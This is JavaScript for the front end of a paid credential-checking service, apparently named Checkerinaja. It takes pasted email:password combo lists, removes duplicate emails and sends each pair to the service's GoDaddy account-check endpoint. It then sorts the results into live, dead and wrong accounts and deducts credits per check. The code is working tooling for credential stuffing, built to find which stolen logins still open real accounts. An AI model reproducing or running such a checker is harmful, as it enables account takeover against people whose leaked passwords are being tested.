var ajaxCall;

		Array.prototype.remove = function(value){
			var index = this.indexOf(value);
			if(index != -1){
				this.splice(index, 1);
			}
			return this;
		};
		function enableTextArea(bool){
			$('#mailpass').attr('disabled', bool);
		}
		function gbrn_liveUp(){
			var count = parseInt($('hirup').html());
			count++;
			$('hirup').html(count+'');
		}
		function gbrn_dieUp(){
			var count = parseInt($('payeh').html());
			count++;
			$('payeh').html(count+'');
		}
		function gbrn_wrongUp(){
			var count = parseInt($('teunyaho').html());
			count++;
			$('teunyaho').html(count+'');
		}
		function gbrn_badUp(){
			var count = parseInt($('bad').html());
			count++;
			$('#bad_count').html(count+'');
		}

		function stopLoading(bool){
					var str = $('#checkStatus').html();
			$('#status').html("STATUS : <span id='checkStatus' style='color:#fff;' class='bg-danger'>STOP</span>");
			enableTextArea(false);
			$('#submit').attr('disabled', false);
			$('#stop').attr('disabled', true);
			if(bool){
				swal({
			title: "Checking Complete",
			timer: 4000,
			type: "success",
			allowEscapeKey: true,
			allowOutsideClick: true,
			text: "Thanks",
			html: true,
			confirmButtonText: "Continue"
        			});
			}else{
				ajaxCall.abort();
			}
				updateTitle('Stopped - Checkerinaja');
		}
		function updateTitle(str){
			document.title = str;
		}
		function updateTextBox(mp){
			var mailpass = $('#mailpass').val().split("\n");
			mailpass.remove(mp);
			$('#mailpass').val(mailpass.join("\n"));
		}
		function GbrnTmfn(lstMP, curMP, delim, checker, no, bal, price){


			
			if(lstMP.length<1 || curMP>=lstMP.length){
				stopLoading(true);
				return false;
			}
			updateTextBox(lstMP[curMP]);
			ajaxCall = $.ajax({
				
				url: 'https://checkerinaja.com/checker/account/godaddy/check',
				dataType: 'json',
				cache: false,
				type: 'POST',
				beforeSend: function (e) {
					updateTitle('['+no+'/'+lstMP.length+']  Checking - MamangCombos');
					$('#status').html("STATUS : <span id='checkStatus' style='color:#fff;' class='bg-primary'>RUN</span>");			
				},
				headers: {'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')},
				data: 'mailpass='+encodeURIComponent(lstMP[curMP])+'&delim='+encodeURIComponent(delim)+'&name='+checker+'&price='+price,
				success: function(data) {
					switch(data.error){
						case -1:
							curMP++;
							$('#wrong').append(data.msg+'<br />');
							gbrn_wrongUp();
							break;
						case 1:
						case 3:
						case 2:
							curMP++;
							$('#acc_die').append(data.msg+'<br />');
							gbrn_dieUp();
							break;
						case 0:
							curMP++;
							$('#acc_live').append(data.msg+'<br />');
							$('#balance').text(data.bal);
							gbrn_liveUp();
							break;
					}
					if(data.bal == 0 || data.bal < 1){
						$('#status').html("STATUS : <span id='checkStatus' style='color:#fff;' class='bg-danger'>STOP</span>");
						enableTextArea(false);
						$('#submit').attr('disabled', false);
						$('#stop').attr('disabled', true);
						swal({title: "Checked STOPPED!!",
						timer: 4000,
						allowEscapeKey: true,
						allowOutsideClick: true,
						type: "error",
						text: "You do not have enough credits, please topup!",
						confirmButtonText: "Continue"});
						updateTitle('Stopped - Checkerinaja');
						return false;
					}
					no++;
					GbrnTmfn(lstMP, curMP, delim, checker, no, bal, price);
				}
			});
			return true;
		}
		function filterMP(mp, delim){
			var mps = mp.split("\n");
			var filtered = new Array();
			var lstMP = new Array();
			for(var i=0;i<mps.length;i++){
				if(mps[i].indexOf('@')!=-1){
					var infoMP = mps[i].split(delim);
					for(var k=0;k<infoMP.length;k++){
						if(infoMP[k].indexOf('@')!=-1){
							var email = $.trim(infoMP[k]);
							var pwd = $.trim(infoMP[k+1]);
							if(filtered.indexOf(email.toLowerCase())==-1){
								filtered.push(email.toLowerCase());
								lstMP.push(email+'|'+pwd);
								break;
							}
						}
					}
				}
			}
			return lstMP;
		}
		function resetResult() {
			$('#acc_die,#wrong').html('');
			$('#acc_die_count,#wrong_count').text(0);
		}
		$(document).ready(function(){
			$('#stop').attr('disabled', true).click(function(){
			  stopLoading(false);  
			});
			$('#submit').click(function(){
				var no = 1;
				var delim = $('#delim').val().trim();
				var mailpass = filterMP($('#mailpass').val(), delim);
				var checker = $('#checker').val().trim();
				var price = parseInt($('#price').val().trim());
				var bal = parseInt($('#balance').text());
				if(bal == 0 || bal < 1){
					swal({title: "Can't Check",
				timer: 4000,
				allowEscapeKey: true,
				allowOutsideClick: true,
				type: "error",
				text: "You do not have enough credits, please topup!",
				confirmButtonText: "Continue"});
					return false;
				}
				if($('#mailpass').val().trim()==''){
				swal({
				title: "Can't Check",
				timer: 4000,
				allowEscapeKey: true,
				allowOutsideClick: true,
				type: "error",
				text: "Please drop an email and password in the fields!",
				confirmButtonText: "Continue"
				     });
				return false;
				}
				$('#mailpass').val(mailpass.join("\n")).attr('disabled', true);
				$('#result').fadeIn(1000);
				resetResult();
				$('#submit').attr('disabled', true);
				$('#stop').attr('disabled', false);
				GbrnTmfn(mailpass, 0, delim, checker, no, bal, price);
				return false; 
			});
		});
	function selectText(containerid) {
		if (document.selection) {
			var range = document.body.createTextRange();
			range.moveToElementText(document.getElementById(containerid));
			range.select();
			} else if (window.getSelection()) {
				var range = document.createRange();
				range.selectNode(document.getElementById(containerid));
				window.getSelection().removeAllRanges();
				window.getSelection().addRange(range);
			}
		}
